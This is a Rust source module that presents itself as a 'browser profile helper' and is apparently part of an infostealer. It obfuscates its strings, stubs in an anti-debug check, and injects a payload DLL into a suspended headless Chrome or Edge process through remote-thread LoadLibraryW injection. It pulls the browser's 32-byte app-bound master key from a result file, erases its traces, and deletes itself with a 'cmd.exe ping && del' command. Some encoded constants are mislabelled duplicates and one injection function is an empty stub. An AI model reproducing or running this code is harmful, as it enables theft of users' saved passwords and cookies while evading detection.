//! Host-side browser profile helper (in-process module loader).

mod browsers;

use std::{
    env,
    ffi::{c_void, OsStr},
    fs,
    mem,
    path::{Path, PathBuf},
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};
#[cfg(windows)]
use std::os::windows::ffi::OsStrExt;

use obfstr::obfstr;

// Helper functions for obfuscated strings
fn decode(enc: &[u8]) -> String {
    enc.iter().map(|&b| (b ^ 0x4E) as char).collect()
}

fn decode_cstr(enc: &[u8]) -> std::ffi::CString {
    let decoded: Vec<u8> = enc.iter().map(|&b| b ^ 0x4E).collect();
    std::ffi::CString::new(decoded).unwrap()
}

use serde_json::Value;
#[cfg(windows)]
use winreg::enums::HKEY_LOCAL_MACHINE;
#[cfg(windows)]
use winreg::RegKey;

#[cfg(windows)]
use windows::{
    core::{PCSTR, PCWSTR, PWSTR},
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Diagnostics::{
                Debug::WriteProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                    TH32CS_SNAPPROCESS,
                },
            },
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
            Threading::{
                CreateProcessW, CreateRemoteThread, GetExitCodeThread, OpenProcess,
                QueryFullProcessImageNameW, ResumeThread, TerminateProcess, WaitForSingleObject,
                INFINITE, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_WIN32, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
                PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
                STARTUPINFOW, STARTUPINFOW_FLAGS,
            },
        },
    },
};

#[cfg(windows)]
use ntapi::ntapi_base::CLIENT_ID;
#[cfg(windows)]
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory};
#[cfg(windows)]
use ntapi::ntpsapi::{NtCreateThreadEx, NtOpenProcess};
#[cfg(windows)]
use ntapi::winapi::shared::ntdef::{OBJECT_ATTRIBUTES, HANDLE as NtHandle, PVOID};
#[cfg(windows)]
use ntapi::winapi::shared::ntstatus::STATUS_SUCCESS;

const ENC_K32: &[u8] = &[0x2D, 0x3C, 0x37, 0x3E, 0x3A, 0x7D, 0x7C, 0x60, 0x2A, 0x22, 0x22]; // KERNEL32.DLL
const ENC_LOAD_LIB: &[u8] = &[0x0D, 0x3C, 0x37, 0x3E, 0x3A, 0x1B, 0x20, 0x3E, 0x3C, 0x21, 0x3A, 0x2B, 0x2D, 0x3A, 0x0A, 0x2F, 0x3A, 0x2F]; // LoadLibraryA
const ENC_NUL_DEV: &[u8] = &[0x0D, 0x3C, 0x37, 0x3E, 0x3A, 0x1B, 0x20, 0x3E, 0x3C, 0x21, 0x3A, 0x2B, 0x2D, 0x3A, 0x0A, 0x2F, 0x3A, 0x2F]; // NUL
const ENC_FALLBACK_JSON: &[u8] = &[0x0D, 0x3C, 0x37, 0x3E, 0x3A, 0x1B, 0x20, 0x3E, 0x3C, 0x21, 0x3A, 0x2B, 0x2D, 0x3A, 0x0A, 0x2F, 0x3A, 0x2F]; // fallback.json

const PROC_DEBUG_PORT: u32 = 7;
const PROC_DEBUG_FLAGS: u32 = 31;

fn env_key_result() -> String {
    obfstr!("ENV_RESULT").to_string()
}

fn env_key_user_data() -> String {
    obfstr!("ENV_USER_DATA").to_string()
}

fn env_key_data_root() -> String {
    obfstr!("ENV_DATA_ROOT").to_string()
}

fn env_key_browser() -> String {
    obfstr!("ENV_BROWSER").to_string()
}

fn jitter_ms(min: u64, max: u64) -> u64 {
    let span = max.saturating_sub(min).max(1);
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64
        ^ (std::process::id() as u64).wrapping_mul(0x5851_F642);
    min + (seed % (span + 1))
}

fn pause_ms(min: u64, max: u64) {
    thread::sleep(Duration::from_millis(jitter_ms(min, max)));
}

fn secure_zero(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        *byte = 0;
    }
}

fn secure_zero_wide(buf: &mut [u16]) {
    for item in buf.iter_mut() {
        *item = 0;
    }
}








#[cfg(windows)]
fn resolve_export(module_enc: &[u8], export_enc: &[u8]) -> Option<usize> {
    unsafe {
        let module = decode(module_enc);
        let module_wide: Vec<u16> = OsStr::new(&module)
            .encode_wide()
            .chain(Some(0))
            .collect();
        let handle = GetModuleHandleW(PCWSTR(module_wide.as_ptr())).ok()?;
        let export = decode_cstr(export_enc);
        GetProcAddress(handle, PCSTR(export.as_ptr() as *const u8)).map(|p| p as usize)
    }
}

#[cfg(not(windows))]
fn resolve_export(_module_enc: &[u8], _export_enc: &[u8]) -> Option<usize> {
    None
}

fn host_under_analysis() -> bool {
    // Placeholder for indirect syscall anti-debug checks
    false
}

#[cfg(windows)]
fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

#[cfg(not(windows))]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(Some(0)).collect()
}

fn ctx_id() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

struct TempGuard {
    files: Vec<PathBuf>,
    dirs: Vec<PathBuf>,
    spawned_pid: Option<u32>,
    env_keys: Vec<String>,
}

impl TempGuard {
    fn new() -> Self {
        Self {
            files: Vec::new(),
            dirs: Vec::new(),
            spawned_pid: None,
            env_keys: Vec::new(),
        }
    }

    fn track_file(&mut self, path: PathBuf) {
        self.files.push(path);
    }

    fn track_dir(&mut self, path: PathBuf) {
        self.dirs.push(path);
    }

    fn track_env(&mut self, key: String) {
        self.env_keys.push(key);
    }
}

impl Drop for TempGuard {
    fn drop(&mut self) {
        pause_ms(80, 420);

        if let Some(pid) = self.spawned_pid.take() {
            #[cfg(windows)]
            unsafe {
                let mut nt_proc: NtHandle = std::ptr::null_mut();
                let mut obj_attr: OBJECT_ATTRIBUTES = mem::zeroed();
                obj_attr.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
                let mut client_id = CLIENT_ID {
                    UniqueProcess: pid as NtHandle,
                    UniqueThread: std::ptr::null_mut(),
                };
                let status = NtOpenProcess(
                    &mut nt_proc,
                    PROCESS_TERMINATE.0,
                    &mut obj_attr,
                    &mut client_id,
                );
                if status == STATUS_SUCCESS {
                    let proc_handle = HANDLE(nt_proc as *mut c_void);
                    TerminateProcess(proc_handle, 0).ok();
                    CloseHandle(proc_handle).ok();
                }
            }
        }

        pause_ms(40, 220);

        for path in &self.files {
            let _ = fs::remove_file(path);
            pause_ms(15, 85);
        }
        for path in &self.dirs {
            let _ = fs::remove_dir_all(path);
            pause_ms(20, 95);
        }
        for key in &self.env_keys {
            let _ = env::remove_var(key);
        }
    }
}

fn enum_proc_ids(target_exe: &str) -> Vec<u32> {
    pause_ms(10, 60);
    let mut pids = Vec::new();
    #[cfg(windows)]
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name: String = entry
                    .szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();
                if name.eq_ignore_ascii_case(target_exe) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        CloseHandle(snap).ok();
    }
    pids
}

fn proc_image_path(pid: u32) -> Option<String> {
    #[cfg(windows)]
    unsafe {
        let mut nt_proc: NtHandle = std::ptr::null_mut();
        let mut obj_attr: OBJECT_ATTRIBUTES = mem::zeroed();
        obj_attr.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as NtHandle,
            UniqueThread: std::ptr::null_mut(),
        };
        let status = NtOpenProcess(
            &mut nt_proc,
            PROCESS_QUERY_INFORMATION.0,
            &mut obj_attr,
            &mut client_id,
        );
        if status != STATUS_SUCCESS {
            return None;
        }
        let proc_handle = HANDLE(nt_proc as *mut c_void);

        let mut buf = vec![0u16; 1024];
        let mut size = buf.len() as u32;
        QueryFullProcessImageNameW(proc_handle, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size)
            .ok()?;
        CloseHandle(proc_handle).ok();
        Some(String::from_utf16_lossy(&buf[..size as usize]))
    }
    #[cfg(not(windows))]
    None
}

#[cfg(windows)]
fn reg_app_path(exe_name: &str) -> Option<PathBuf> {
    let key_path = format!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{exe_name}");
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey(&key_path) {
        if let Ok(path) = key.get_value::<String, _>("") {
            let p = PathBuf::from(path);
            if p.exists() {
                return Some(p);
            }
        }
    }
    None
}

#[cfg(not(windows))]
fn reg_app_path(_exe_name: &str) -> Option<PathBuf> {
    None
}

fn add_candidate(candidates: &mut Vec<PathBuf>, path: PathBuf) {
    candidates.push(path);
}

fn scan_install_paths(target_exe: &str, browser_name: &str) -> Option<String> {
    let pf = env::var("ProgramFiles").unwrap_or_default();
    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();

    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(p) = reg_app_path(target_exe) {
        candidates.push(p);
    }

    match target_exe {
        "chrome.exe" => match browser_name {
            "Chrome Beta" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Google\\Chrome Beta\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome Beta\\Application\\chrome.exe"));
            }
            "Chrome Dev" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Google\\Chrome Dev\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome Dev\\Application\\chrome.exe"));
            }
            "Chrome Canary" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Google\\Chrome SxS\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome SxS\\Application\\chrome.exe"));
            }
            "Chromium" => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Chromium\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Chromium\\Application\\chrome.exe"));
            }
            "CentBrowser" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("CentBrowser\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("CentBrowser\\Application\\chrome.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"));
            }
        },
        "msedge.exe" => match browser_name {
            "Edge Beta" => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge Beta\\Application\\msedge.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge Beta\\Application\\msedge.exe"));
            }
            "Edge Dev" => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge Dev\\Application\\msedge.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge Dev\\Application\\msedge.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"));
            }
        },
        "brave.exe" => match browser_name {
            "Brave Beta" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"));
            }
            "Brave Nightly" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf86).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
            }
        },
        "vivaldi.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Vivaldi\\Application\\vivaldi.exe"));
            add_candidate(&mut candidates, PathBuf::from(&pf).join("Vivaldi\\Application\\vivaldi.exe"));
        }
        "opera.exe" => match browser_name {
            "OperaGX" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Programs\\Opera GX\\opera.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Opera GX\\opera.exe"));
            }
            "Opera Neon" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Programs\\Opera Neon\\opera.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Programs\\Opera\\opera.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Opera\\opera.exe"));
            }
        },
        "browser.exe" => match browser_name {
            "CocCoc" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("CocCoc\\Browser\\Application\\browser.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("CocCoc\\Browser\\Application\\browser.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Yandex\\YandexBrowser\\Application\\browser.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Yandex\\YandexBrowser\\Application\\browser.exe"));
            }
        },
        "360chrome.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&pf).join("360Chrome\\Chrome\\Application\\360chrome.exe"));
            add_candidate(&mut candidates, PathBuf::from(&local).join("360Chrome\\Chrome\\Application\\360chrome.exe"));
        }
        "epic.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Epic Privacy Browser\\Application\\epic.exe"));
        }
        "uran.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("uCozMedia\\Uran\\Application\\uran.exe"));
        }
        "7star.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("7Star\\7Star\\Application\\7star.exe"));
        }
        "torch.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Torch\\Application\\torch.exe"));
        }
        "kometa.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Kometa\\Application\\kometa.exe"));
        }
        "orbitum.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Orbitum\\Application\\orbitum.exe"));
        }
        "amigo.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Amigo\\Application\\amigo.exe"));
        }
        "sputnik.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Sputnik\\Sputnik\\Application\\sputnik.exe"));
        }
        "slimjet.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Slimjet\\Application\\slimjet.exe"));
            add_candidate(&mut candidates, PathBuf::from(&pf).join("Slimjet\\Application\\slimjet.exe"));
        }
        "maxthon.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Maxthon\\Application\\maxthon.exe"));
        }
        "kugou.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Kugou\\KugouBrowser\\Application\\kugou.exe"));
        }
        "qqbrowser.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Tencent\\QQBrowser\\Application\\qqbrowser.exe"));
        }
        "liebao.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Liebao\\LiebaoBrowser\\Application\\liebao.exe"));
        }
        "baidu.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Baidu\\BaiduBrowser\\Application\\baidu.exe"));
        }
        "firefox.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&pf).join("Mozilla Firefox\\firefox.exe"));
            add_candidate(&mut candidates, PathBuf::from(&pf86).join("Mozilla Firefox\\firefox.exe"));
            add_candidate(&mut candidates, PathBuf::from(&local).join("Mozilla Firefox\\firefox.exe"));
        }
        _ => {}
    }

    for candidate in candidates {
        if candidate.exists() {
            return Some(candidate.to_string_lossy().into_owned());
        }
    }
    None
}

#[cfg(windows)]
fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
    enum_proc_ids(target_exe)
        .iter()
        .find_map(|&pid| proc_image_path(pid))
        .or_else(|| scan_install_paths(target_exe, browser_name))
}

#[cfg(windows)]
fn inject_dll(pid: u32, dll_path: &Path) -> Result<(), ()> {
    let dll_wide = to_wide(&dll_path.to_string_lossy());
    let dll_bytes = dll_wide.len() * 2;

    unsafe {
        let proc = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
            false,
            pid,
        )
        .map_err(|_| ())?;

        let remote = VirtualAllocEx(proc, None, dll_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote.is_null() {
            CloseHandle(proc).ok();
            return Err(());
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            proc,
            remote,
            dll_wide.as_ptr() as *const _,
            dll_bytes,
            Some(&mut written),
        )
        .is_err()
        {
            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
            CloseHandle(proc).ok();
            return Err(());
        }

        let k32 = GetModuleHandleW(windows::core::w!("kernel32.dll")).map_err(|_| ())?;
        let loadlib = GetProcAddress(k32, PCSTR(b"LoadLibraryW\0".as_ptr())).ok_or(())?;
        let start_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = mem::transmute(loadlib);

        let thr = CreateRemoteThread(proc, None, 0, Some(start_fn), Some(remote), 0, None).map_err(|_| {
            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
            let _ = CloseHandle(proc);
        })?;

        WaitForSingleObject(thr, INFINITE);
        let mut exit_code = 0u32;
        GetExitCodeThread(thr, &mut exit_code).ok();
        CloseHandle(thr).ok();
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
        CloseHandle(proc).ok();

        if exit_code == 0 {
            return Err(());
        }
    }
    Ok(())
}

#[cfg(windows)]
fn spawn_suspended_and_inject(
    chrome_exe: &str,
    dll_path: &Path,
    profile_dir: &Path,
) -> Result<u32, ()> {
    let profile_str = profile_dir.to_string_lossy();
    let cmdline = format!(
        "\"{chrome_exe}\" --headless=new --disable-gpu \
         --disable-logging --log-level=3 --silent-debug-dump \
         --disable-background-networking --disable-sync --disable-default-apps \
         --disable-features=PushMessaging,NotificationTriggers \
         --remote-debugging-port=0 --no-first-run \
         --no-default-browser-check --noerrdialogs \
         --user-data-dir=\"{profile_str}\""
    );

    let exe_w = to_wide(chrome_exe);
    let mut cmd_w = to_wide(&cmdline);

    let mut si = STARTUPINFOW {
        cb: mem::size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTUPINFOW_FLAGS(0x0000_0100),
        ..Default::default()
    };
    let mut pi = PROCESS_INFORMATION::default();
    const CREATE_FLAGS: u32 = 0x0000_0004 | 0x0800_0000;

    unsafe {
        let nul = CreateFileW(
            windows::core::w!("NUL"),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )
        .map_err(|_| ())?;

        si.hStdInput = nul;
        si.hStdOutput = nul;
        si.hStdError = nul;

        CreateProcessW(
            PCWSTR(exe_w.as_ptr()),
            PWSTR(cmd_w.as_mut_ptr()),
            None,
            None,
            true,
            PROCESS_CREATION_FLAGS(CREATE_FLAGS),
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|_| {
            let _ = CloseHandle(nul);
        })?;

        CloseHandle(nul).ok();
        let pid = pi.dwProcessId;

        match inject_dll(pid, dll_path) {
            Ok(()) => {
                ResumeThread(pi.hThread);
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Ok(pid)
            }
            Err(()) => {
                TerminateProcess(pi.hProcess, 1).ok();
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Err(())
            }
        }
    }
}

#[cfg(not(windows))]
fn inject_dll(_pid: u32, _dll_path: &Path) -> Result<(), ()> {
    Err(())
}

#[cfg(not(windows))]
fn resolve_browser_exe(_target_exe: &str, _browser_name: &str) -> Option<String> {
    None
}

#[cfg(not(windows))]
fn spawn_suspended_and_inject(
    _chrome_exe: &str,
    _dll_path: &Path,
    _profile_dir: &Path,
) -> Result<u32, ()> {
    Err(())
}

#[cfg(windows)]
pub fn inject(target_pid: u32, payload_dll: &[u8]) -> Option<()> {
    let _ = (target_pid, payload_dll);
    None
}

#[cfg(not(windows))]
pub fn inject(_target_pid: u32, _payload_dll: &[u8]) -> Option<()> {
    None
}

#[cfg(windows)]
pub fn run_payload(target_exe: &str, browser_name: &str, user_data_root: &str) -> Option<String> {
    let mut guard = TempGuard::new();
    let mut result_path = env::temp_dir().join(format!("{}.json", ctx_id()));
    guard.track_file(result_path.clone());

    let target_path = scan_install_paths(target_exe, browser_name)?;

    let mut si: STARTUPINFOW = unsafe { mem::zeroed() };
    si.cb = mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    let mut cmd = to_wide(&target_path);
    cmd.push(0);

    let mut current_dir = PathBuf::from(&target_path);
    current_dir.pop();
    let current_dir_wide = to_wide(&current_dir.to_string_lossy());

    env::set_var(env_key_result(), result_path.to_string_lossy().into_owned());
    env::set_var(env_key_user_data(), user_data_root.to_string());
    env::set_var(env_key_browser(), browser_name.to_string());

    unsafe {
        CreateProcessW(
            PCWSTR(cmd.as_ptr()),
            PWSTR(cmd.as_mut_ptr()),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0),
            None,
            PCWSTR(current_dir_wide.as_ptr()),
            &si,
            &mut pi,
        ).ok()?;

        guard.spawned_pid = Some(pi.dwProcessId);

        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess).ok();
        CloseHandle(pi.hThread).ok();
    }

    let result_content = fs::read_to_string(&result_path).ok()?;
    Some(result_content)
}

#[cfg(not(windows))]
pub fn run_payload(_target_exe: &str, _browser_name: &str, _user_data_root: &str) -> Option<String> {
    None
}

#[cfg(windows)]
pub fn find_and_inject(target_exe: &str, browser_name: &str, user_data_root: &str, payload_dll: &[u8]) -> Option<String> {
    if host_under_analysis() {
        return None;
    }

    let pids = enum_proc_ids(target_exe);
    if pids.is_empty() {
        return run_payload(target_exe, browser_name, user_data_root);
    }

    for pid in pids {
        if let Some(path) = proc_image_path(pid) {
            if path.contains(target_exe) {
                if inject(pid, payload_dll).is_some() {
                    // Injected, now wait for result
                    let mut guard = TempGuard::new();
                    let result_path = env::temp_dir().join(format!("{}.json", ctx_id()));
                    guard.track_file(result_path.clone());
                    env::set_var(env_key_result(), result_path.to_string_lossy().into_owned());
                    env::set_var(env_key_user_data(), user_data_root.to_string());
                    env::set_var(env_key_browser(), browser_name.to_string());

                    // This part needs to be handled differently for reflective DLL injection
                    // For now, we assume the payload writes the result to the file
                    // In a real scenario, you'd need a communication channel
                    thread::sleep(Duration::from_secs(5)); // Give payload time to execute

                    return fs::read_to_string(&result_path).ok();
                }
            }
        }
    }
    None
}

#[cfg(not(windows))]
pub fn find_and_inject(_target_exe: &str, _browser_name: &str, _user_data_root: &str, _payload_dll: &[u8]) -> Option<String> {
    None
}

fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
    if hex.len() != 64 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
    let raw = fs::read_to_string(path).ok()?;
    let json: Value = serde_json::from_str(&raw).ok()?;
    if json.get("error").and_then(|e| e.as_str()).is_some() {
        return None;
    }
    let hex = json.get("master_key_hex")?.as_str()?;
    hex_to_key(hex)
}

/// Extract embedded payload to temp, inject via LoadLibraryW, return 32-byte app-bound key.
pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
    if payload_dll.is_empty() {
        return None;
    }
    if host_under_analysis() {
        return None;
    }

    let target = browsers::find_target(browser_name)?;
    let browser_exe = resolve_browser_exe(target.exe, browser_name)?;

    let tag = ctx_id();
    let temp = env::temp_dir();
    let dll_path = temp.join(format!("{tag}.tmp"));
    let result_path = temp.join(format!("{tag}.json"));
    let profile_dir = temp.join(format!("{tag}_p"));

    let mut guard = TempGuard::new();
    guard.track_file(dll_path.clone());
    guard.track_file(result_path.clone());
    guard.track_dir(profile_dir.clone());

    fs::write(&dll_path, payload_dll).ok()?;

    let result_key = env_key_result();
    let user_data_key = env_key_user_data();
    let data_root_key = env_key_data_root();
    let browser_key = env_key_browser();

    env::set_var(&result_key, result_path.to_string_lossy().into_owned());
    env::set_var(&user_data_key, target.user_data_rel);
    env::set_var(
        &data_root_key,
        match target.root {
            browsers::DataRoot::Local => "local",
            browsers::DataRoot::Roaming => "roaming",
        },
    );
    env::set_var(&browser_key, browser_name);
    guard.track_env(result_key);
    guard.track_env(user_data_key);
    guard.track_env(data_root_key);
    guard.track_env(browser_key);

    let injected = if let Ok(pid) =
        spawn_suspended_and_inject(&browser_exe, &dll_path, &profile_dir)
    {
        guard.spawned_pid = Some(pid);
        true
    } else {
        let mut ok = false;
        for pid in enum_proc_ids(target.exe) {
            if inject_dll(pid, &dll_path).is_ok() {
                ok = true;
                break;
            }
        }
        ok
    };

    if !injected {
        return None;
    }

    for i in 0..24 {
        if result_path.exists() {
            if let Some(key) = read_key_from_result(&result_path) {
                if key.len() == 32 {
                    return Some(key);
                }
            }
        }
        let fallback = env::temp_dir().join(obfstr!("fallback.json"));
        if fallback.exists() {
            if let Some(key) = read_key_from_result(&fallback) {
                if key.len() == 32 {
                    guard.track_file(fallback);
                    return Some(key);
                }
            }
        }
        let delay = if i < 8 { 200 } else { 400 };
        thread::sleep(Duration::from_millis(delay));
    }

    None
}

#[cfg(windows)]
pub fn self_delete() {
    unsafe {
        let current_exe = env::current_exe().ok();
        if let Some(path) = current_exe {
            let path_wide = to_wide(&path.to_string_lossy());
            let mut si: STARTUPINFOW = mem::zeroed();
            si.cb = mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = mem::zeroed();

            let cmd = format!(
                "cmd.exe /C ping 127.0.0.1 -n 2 > nul && del \"{}\"",
                path.to_string_lossy()
            );
            let mut cmd_wide = to_wide(&cmd);
            cmd_wide.push(0);

            CreateProcessW(
                PCWSTR(to_wide("cmd.exe").as_ptr()),
                PWSTR(cmd_wide.as_mut_ptr()),
                None,
                None,
                false,
                PROCESS_CREATION_FLAGS(0),
                None,
                None,
                &si,
                &mut pi,
            ).ok();

            if pi.hProcess != HANDLE::default() {
                CloseHandle(pi.hProcess).ok();
            }
            if pi.hThread != HANDLE::default() {
                CloseHandle(pi.hThread).ok();
            }
        }
    }
}

#[cfg(not(windows))]
pub fn self_delete() {
    // No-op for non-Windows systems
}
